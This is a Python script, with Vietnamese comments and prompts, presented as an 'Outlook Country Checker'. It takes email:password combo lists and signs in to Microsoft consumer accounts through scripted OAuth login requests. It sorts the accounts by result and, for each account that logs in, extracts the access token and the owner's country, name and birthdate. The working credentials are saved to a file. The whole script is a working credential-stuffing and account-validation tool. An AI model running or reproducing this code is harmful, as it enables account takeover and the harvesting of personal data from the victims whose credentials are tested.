import requests
import re
import uuid
import time
import os
import json

class OutlookCountryChecker:
    def __init__(self, debug=False):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.debug = debug
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        
        # Country code mapping để hiển thị tên đầy đủ
        self.country_names = {
            "US": "United States", "GB": "United Kingdom", "CA": "Canada",
            "AU": "Australia", "DE": "Germany", "FR": "France", "IT": "Italy",
            "ES": "Spain", "NL": "Netherlands", "SE": "Sweden", "NO": "Norway",
            "DK": "Denmark", "FI": "Finland", "BE": "Belgium", "CH": "Switzerland",
            "AT": "Austria", "IE": "Ireland", "NZ": "New Zealand", "SG": "Singapore",
            "HK": "Hong Kong", "JP": "Japan", "KR": "South Korea", "CN": "China",
            "IN": "India", "BR": "Brazil", "MX": "Mexico", "AR": "Argentina",
            "CL": "Chile", "CO": "Colombia", "PE": "Peru", "VE": "Venezuela",
            "ZA": "South Africa", "EG": "Egypt", "NG": "Nigeria", "KE": "Kenya",
            "PL": "Poland", "RU": "Russia", "UA": "Ukraine", "TR": "Turkey",
            "SA": "Saudi Arabia", "AE": "UAE", "IL": "Israel", "TH": "Thailand",
            "MY": "Malaysia", "ID": "Indonesia", "PH": "Philippines", "VN": "Vietnam",
            "PK": "Pakistan", "BD": "Bangladesh", "CZ": "Czech Republic",
            "GR": "Greece", "PT": "Portugal", "RO": "Romania", "HU": "Hungary"
        }
        
    def log(self, message):
        if self.debug:
            print(f"[DEBUG] {message}")
    
    def get_country_name(self, code):
        """Convert country code to full name"""
        if not code or code == "N/A":
            return "N/A"
        code = code.upper().strip()
        return self.country_names.get(code, code)
        
    def check_account(self, email, password):
        try:
            self.log(f"Bắt đầu kiểm tra: {email}")
            
            # --- BƯỚC 1: Kiểm tra tài khoản (IDP) ---
            self.log("Bước 1: Kiểm tra IDP...")
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-CorrelationId": self.uuid,
                "User-Agent": self.ua,
                "Accept": "application/json"
            }
            
            r1 = self.session.get(url1, headers=headers1, timeout=10)
            self.log(f"IDP Response: {r1.status_code}")
            
            if "MSAccount" not in r1.text:
                return "❌ BAD | Email không tồn tại"

            # --- BƯỚC 2: OAuth authorize để lấy PPFT ---
            self.log("Bước 2: OAuth authorize...")
            time.sleep(1)
            
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": self.ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9"
            }
            
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=10)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                self.log("❌ Không tìm thấy PPFT hoặc URL")
                return "❌ BAD | Lỗi lấy dữ liệu đăng nhập"

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            self.log(f"PPFT: {ppft[:30]}...")

            # --- BƯỚC 3: Đăng nhập (POST) ---
            self.log("Bước 3: Đăng nhập...")
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            self.log(f"Login response: {r3.status_code}")

            # Kiểm tra lỗi đăng nhập
            if "account or password is incorrect" in r3.text or "incorrect" in r3.text.lower():
                return "❌ BAD | Sai mật khẩu"
            
            if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in r3.text:
                return "❌ BAD | Cần Verify"

            if "https://account.live.com/Abuse" in r3.text or "Abuse" in r3.text:
                return "❌ BAD | Bị khóa"

            # Lấy authorization code từ redirect
            location = r3.headers.get("Location", "")
            if not location:
                self.log("❌ Không tìm thấy redirect location")
                return "❌ BAD | Lỗi đăng nhập"

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                self.log("❌ Không tìm thấy auth code")
                return "❌ BAD | Lỗi xác thực"

            code = code_match.group(1)
            self.log(f"✅ Auth code: {code[:30]}...")

            # Lấy CID từ cookies
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                self.log("❌ Không tìm thấy CID")
                return "❌ BAD | Lỗi session"

            cid = mspcid.upper()
            self.log(f"CID: {cid}")

            # --- BƯỚC 4: Lấy Access Token ---
            self.log("Bước 4: Lấy token...")
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"

            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                   data=token_data,
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=10)

            if "access_token" not in r4.text:
                self.log(f"❌ Không lấy được token: {r4.text[:200]}")
                return "❌ BAD | Lỗi token"

            token_json = r4.json()
            access_token = token_json["access_token"]
            self.log(f"✅ Token nhận được")

            # --- BƯỚC 5: Lấy thông tin Country ---
            self.log("Bước 5: Lấy thông tin profile...")
            
            country = "N/A"
            country_full = "N/A"
            name = ""
            birthdate = ""
            location_source = "Unknown"  # Để biết location lấy từ đâu
            
            # Phương pháp chính: Substrate Office API (đã test thành công)
            try:
                self.log("Gọi API: substrate.office.com...")
                profile_headers = {
                    "User-Agent": "Outlook-Android/2.0",
                    "Authorization": f"Bearer {access_token}",
                    "X-AnchorMailbox": f"CID:{cid}",
                    "Accept": "application/json"
                }

                r5 = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", 
                                     headers=profile_headers, timeout=15)

                if r5.status_code == 200:
                    profile = r5.json()
                    self.log(f"API Response nhận được, parsing data...")
                    
                    # DEBUG: Log toàn bộ response để xem cấu trúc
                    if self.debug:
                        self.log(f"Full API Response: {json.dumps(profile, indent=2)}")
                    
                    # Parse all possible country fields
                    if "accounts" in profile and isinstance(profile["accounts"], list):
                        for account in profile["accounts"]:
                            if "location" in account and account["location"]:
                                country = account["location"]
                                location_source = "accounts.location (System)"
                                self.log(f"✅ Tìm thấy location trong accounts: {country}")
                                break
                    
                    # Thử các field khác nếu chưa có
                    if country == "N/A":
                        country = profile.get("location", "N/A")
                        if country != "N/A":
                            location_source = "profile.location"
                    if country == "N/A":
                        country = profile.get("country", "N/A")
                        if country != "N/A":
                            location_source = "profile.country"
                    if country == "N/A":
                        country = profile.get("region", "N/A")
                        if country != "N/A":
                            location_source = "profile.region"
                    
                    # Lấy name
                    name = profile.get("displayName", "")
                    if not name and "accounts" in profile:
                        for account in profile.get("accounts", []):
                            if "userPrincipalName" in account:
                                name = account.get("passportMemberName", "")
                                break
                    
                    # Lấy birthdate
                    birth_day = profile.get("birthDay", "")
                    birth_month = profile.get("birthMonth", "")
                    birth_year = profile.get("birthYear", "")
                    
                    if not birth_day and "accounts" in profile:
                        for account in profile.get("accounts", []):
                            birth_day = account.get("birthDay", "")
                            birth_month = account.get("birthMonth", "")
                            birth_year = account.get("birthYear", "")
                            if birth_day:
                                break
                    
                    if birth_day and birth_month and birth_year:
                        birthdate = f"{birth_day:02d}/{birth_month:02d}/{birth_year}"
                    
                    # Convert country code to full name
                    country_full = self.get_country_name(country)
                    
                    if country != "N/A":
                        self.log(f"✅ Country: {country} ({country_full}) - Source: {location_source}")
                else:
                    self.log(f"⚠️ API status: {r5.status_code}")
                    
            except Exception as e:
                self.log(f"⚠️ API error: {str(e)}")

            # Tạo kết quả với format đẹp
            if country != "N/A":
                result = f"✅ SUCCESS | 🌍 {country_full} ({country})"
            else:
                result = f"✅ SUCCESS | 🌍 Country: Unknown"
            
            if name:
                result += f" | 👤 {name}"
            if birthdate:
                result += f" | 🎂 {birthdate}"
                
            return result

        except requests.exceptions.Timeout:
            self.log("❌ Timeout")
            return "❌ ERROR | Timeout"
        except requests.exceptions.RequestException as e:
            self.log(f"❌ Request Error: {str(e)}")
            return f"❌ ERROR | Request Error"
        except Exception as e:
            self.log(f"❌ Exception: {str(e)}")
            if self.debug:
                import traceback
                self.log(traceback.format_exc())
            return f"❌ ERROR | {str(e)}"

def main():
    class Colors:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        CYAN = '\033[96m'
        MAGENTA = '\033[95m'
        WHITE = '\033[97m'  # ✅ THÊM MÀU WHITE
        BOLD = '\033[1m'
        END = '\033[0m'

    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("╔" + "═" * 68 + "╗")
    print("║" + "   OUTLOOK COUNTRY CHECKER - PROFESSIONAL VERSION   ".center(68) + "║")
    print("╚" + "═" * 68 + "╝")
    print(Colors.END)

    # Chọn chế độ
    print(f"\n{Colors.BOLD}{Colors.CYAN}📋 CHỌN CHẾ ĐỘ:{Colors.END}")
    print(f"{Colors.GREEN}[1]{Colors.END} Kiểm tra 1 tài khoản")
    print(f"{Colors.GREEN}[2]{Colors.END} Kiểm tra nhiều tài khoản từ file")
    
    choice = input(f"\n{Colors.BOLD}{Colors.YELLOW}➤ Lựa chọn (1/2): {Colors.END}").strip()
    
    # Hỏi debug mode
    debug_input = input(f"{Colors.BOLD}{Colors.CYAN}➤ Bật chế độ debug? (y/n): {Colors.END}").strip().lower()
    debug_mode = debug_input == 'y'
    
    checker = OutlookCountryChecker(debug=debug_mode)
    
    if choice == "1":
        # Kiểm tra 1 tài khoản
        print(f"\n{Colors.CYAN}{'═' * 70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}          SINGLE ACCOUNT CHECK{Colors.END}")
        print(f"{Colors.CYAN}{'═' * 70}{Colors.END}")
        
        email = input(f"\n{Colors.BOLD}{Colors.GREEN}📧 Email: {Colors.END}").strip()
        password = input(f"{Colors.BOLD}{Colors.GREEN}🔑 Password: {Colors.END}").strip()
        
        print(f"\n{Colors.YELLOW}🔄 Đang kiểm tra...{Colors.END}\n")
        print(f"{Colors.CYAN}{'-' * 70}{Colors.END}")
        result = checker.check_account(email, password)
        
        if "✅ SUCCESS" in result:
            print(f"\n{Colors.GREEN}{Colors.BOLD}✨ {result}{Colors.END}")
            print(f"\n{Colors.CYAN}📧 Account: {Colors.WHITE}{email}:{password}{Colors.END}")
        else:
            print(f"\n{Colors.RED}{Colors.BOLD}{result}{Colors.END}")
            print(f"\n{Colors.CYAN}📧 Account: {Colors.WHITE}{email}:{password}{Colors.END}")
        
        print(f"{Colors.CYAN}{'-' * 70}{Colors.END}")
        
    elif choice == "2":
        # Kiểm tra nhiều tài khoản
        print(f"\n{Colors.CYAN}{'═' * 70}{Colors.END}")
        file_path = input(f"{Colors.BOLD}{Colors.GREEN}📁 Nhập tên file accounts (vd: list.txt): {Colors.END}").strip()

        if not os.path.exists(file_path):
            print(f"{Colors.RED}❌ Lỗi: Không tìm thấy file {file_path}{Colors.END}")
            return

        with open(file_path, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if ":" in line.strip()]

        print(f"\n{Colors.CYAN}📊 Tìm thấy {len(lines)} tài khoản{Colors.END}")
        print(f"{Colors.CYAN}{'═' * 70}{Colors.END}\n")

        success_count = 0
        fail_count = 0
        
        # Tạo file output
        success_file = "success_accounts.txt"
        fail_file = "failed_accounts.txt"
        
        # Clear old files
        for f in [success_file, fail_file]:
            if os.path.exists(f):
                os.remove(f)
        
        for i, line in enumerate(lines, 1):
            try:
                email, password = line.split(":", 1)
                email = email.strip()
                password = password.strip()
                
                print(f"{Colors.CYAN}[{i}/{len(lines)}]{Colors.END} {Colors.WHITE}{email}{Colors.END} ", end="")
                print(f"{Colors.YELLOW}checking...{Colors.END}")
                
                result = checker.check_account(email, password)
                
                full_result = f"{email}:{password} | {result}"
                
                if "✅ SUCCESS" in result:
                    print(f"{Colors.GREEN}{Colors.BOLD}  └─ {result}{Colors.END}")
                    with open(success_file, 'a', encoding='utf-8') as f:
                        f.write(full_result + '\n')
                    success_count += 1
                else:
                    print(f"{Colors.RED}  └─ {result}{Colors.END}")
                    with open(fail_file, 'a', encoding='utf-8') as f:
                        f.write(full_result + '\n')
                    fail_count += 1
                
                print(f"{Colors.CYAN}{'-' * 70}{Colors.END}")
                time.sleep(2)
                
            except ValueError:
                print(f"{Colors.RED}⚠️ Format không hợp lệ: {line}{Colors.END}")
                continue
        
        # Hiển thị kết quả tổng hợp
        print(f"\n{Colors.CYAN}{'═' * 70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}                  📊 KẾT QUẢ TỔNG HỢP{Colors.END}")
        print(f"{Colors.CYAN}{'═' * 70}{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}✅ Thành công: {success_count}{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}❌ Thất bại: {fail_count}{Colors.END}")
        print(f"{Colors.CYAN}{'═' * 70}{Colors.END}")
        
        if success_count > 0:
            print(f"\n{Colors.GREEN}✅ Tài khoản thành công đã lưu vào '{success_file}'{Colors.END}")
        if fail_count > 0:
            print(f"{Colors.RED}❌ Tài khoản thất bại đã lưu vào '{fail_file}'{Colors.END}")
    
    else:
        print(f"\n{Colors.RED}❌ Lựa chọn không hợp lệ!{Colors.END}")

    print(f"\n{Colors.CYAN}{'═' * 70}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.GREEN}✨ HOÀN THÀNH!{Colors.END}")
    print(f"{Colors.CYAN}{'═' * 70}{Colors.END}")

if __name__ == "__main__":
    main()